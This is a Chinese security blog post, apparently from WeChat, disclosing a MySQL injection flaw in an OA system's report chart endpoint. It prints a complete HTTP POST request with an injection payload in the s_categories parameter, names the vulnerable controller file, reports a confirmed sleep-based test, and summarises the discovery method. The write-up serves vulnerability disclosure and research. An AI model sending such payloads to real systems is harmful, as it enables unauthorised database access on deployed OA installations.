\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/cedGEdnK7lVfmdAl\_Suw1Q)

**![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqczeflvHvDexuf2BhBEBYlJCdjJS6aVZ0w6ooY5QwK27L2khaJWEOVdw2kunkBTviakCv6QeGxYjHg/640?wx_fmt=png)**

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqc9YP8YkJ4v8XkhBmarxGHmS0B3XhFLyXWOWJ2icz6Sc3Wd6p7zICm4fbA9FIvONN6yeeib9RLBY0gA/640?wx_fmt=png)

```
POST /general/appbuilder/web/report/repchart/data 
HTTP/1.1UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
Referer: http://192.168.202.1/general/appbuilder/web/report/repchart?reportId=
X-ResourceType: xhr
Cookie: PHPSESSID=1kqh5um8augkhrq8q6n7t23h46; USER\_NAME\_COOKIE=admin; OA\_USER\_ID=admin; SID\_1=cb7abbef
Connection: close
Host: 192.168.202.1
Pragma: no-cache
x-requested-with: XMLHttpRequest
Content-Length: 539
x-wvs-id: Acunetix-Deepscan/288
Cache-Control: no-cache
accept: \*/\*
origin: http://192.168.202.1
Accept-Language: en-US
content-type: application/x-www-form-urlencoded; charset=UTF-8

data\_path=%5B%5D&s\_categories="23fd<>select 9j@!fdf" #)&i\_dataset=10¶ms%5BsearchParams%5D%5B0%5D%5Bid%5D=¶ms%5BsearchParams%5D%5B0%5D%5Bkey%5D=1598155037212¶ms%5BsearchParams%5D%5B0%5D%5Blabel%5D=%E5%85%AC%E5%91%8AID¶ms%5BsearchParams%5D%5B0%5D%5Btype%5D=text¶ms%5BsearchParams%5D%5B0%5D%5Bvalue%5D=¶ms%5BsearchParams%5D%5B0%5D%5Bscope%5D=equal¶ms%5BsearchParams%5D%5B0%5D%5Bmacro%5D=false¶ms%5BsearchParams%5D%5B0%5D%5Btype\_of\_data%5D=rep¶ms%5BsearchParams%5D%5B0%5D%5Btype\_of\_reports%5D=select&id=
```

**漏洞证明：**

查看 Mysql 数据库的执行过程，mysql 日志文件，可以发现 **s\_categories** 传入的参数，被 mysql 数据库完整执行了，没有任何过滤，可以确定存在 mysql 注入漏洞

**漏洞文件：**

webroot\\general\\appbuilder\\modules\\report\\controllers\\RepChartController.php  

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqc9YP8YkJ4v8XkhBmarxGHmmxpwNLhBLEibeY8bQYLLhzwicthcoe1bHk2BarZZlbnibvlP3Yw94gbGw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqc9YP8YkJ4v8XkhBmarxGHmWrp79r6icDzPib18XZwo8KFPFtKBC0MIRrlwFwjgWxZVs89UV0FFubjg/640?wx_fmt=png)

测试执行 sleep 函数，注释后面语句来测试，被成功执行。

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqc9YP8YkJ4v8XkhBmarxGHmqvGaLPzrlHJfjejOc1ibuURMRRg9dL0iafsbvYogNACpvBpuibnjibOhRg/640?wx_fmt=png)

**挖掘思路：**

Fuzz+sql 日志关键字匹配 + 审计

![](https://mmbiz.qpic.cn/mmbiz_jpg/RpxgdDjibJqc9YP8YkJ4v8XkhBmarxGHm5KEAoZlEKpGASJIa1G2oowOZbia7Wngot8QMkmiczsJb0icoian14Ubtkg/640?wx_fmt=jpeg)

联系微信

**END.**

**欢迎转发~**

**欢迎关注~**

**欢迎点赞~**